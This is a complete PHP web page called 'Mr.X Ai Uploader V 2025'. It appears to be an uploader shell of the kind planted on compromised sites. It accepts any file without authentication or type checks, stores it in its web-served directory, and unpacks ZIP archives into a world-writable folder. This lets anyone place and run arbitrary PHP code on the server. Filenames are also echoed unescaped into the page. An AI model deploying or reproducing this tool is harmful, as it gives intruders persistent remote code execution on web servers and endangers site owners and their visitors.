<!DOCTYPE html>
<html>
<head>
    <title>Mr.X Ai Uploader V 2025</title>
</head>
<body>
    <h1>Mr.X Ai Uploader V 2025</h1>
    <hr>
    <h2>Upload File</h2>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="upload_file" required>
        <button type="submit" name="submit">Upload</button>
    </form>

<?php
if (isset($_POST['submit'])) {
    $file = $_FILES['upload_file'];
    if ($file['error'] === UPLOAD_ERR_OK) {
        $filename = basename($file['name']);
        $targetPath = __DIR__ . '/' . $filename;

        if (move_uploaded_file($file['tmp_name'], $targetPath)) {
            $fileUrl = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . '/' . $filename;
            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

            if ($ext === 'zip') {
                $zip = new ZipArchive;
                if ($zip->open($targetPath) === TRUE) {
                    $extractFolder = __DIR__ . '/' . pathinfo($filename, PATHINFO_FILENAME);
                    if (!is_dir($extractFolder)) {
                        mkdir($extractFolder, 0777, true);
                    }
                    $zip->extractTo($extractFolder);
                    $zip->close();

                    echo "<p>ZIP file extracted:</p><ul>";
                    $files = scandir($extractFolder);
                    foreach ($files as $f) {
                        if ($f !== '.' && $f !== '..') {
                            $extractedUrl = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . '/' . pathinfo($filename, PATHINFO_FILENAME) . '/' . $f;
                            echo "<li><a href=\"$extractedUrl\" target=\"_blank\">$f</a></li>";
                        }
                    }
                    echo "</ul>";
                } else {
                    echo "<p>Failed to unzip the file.</p>";
                }
            } else {
                echo "<p>File uploaded: <a href=\"$fileUrl\" target=\"_blank\">$filename</a></p>";
            }
        } else {
            echo "<p>Failed to upload file.</p>";
        }
    } else {
        echo "<p>Error uploading file. Code: " . $file['error'] . "</p>";
    }
}
?>
</body>
</html>
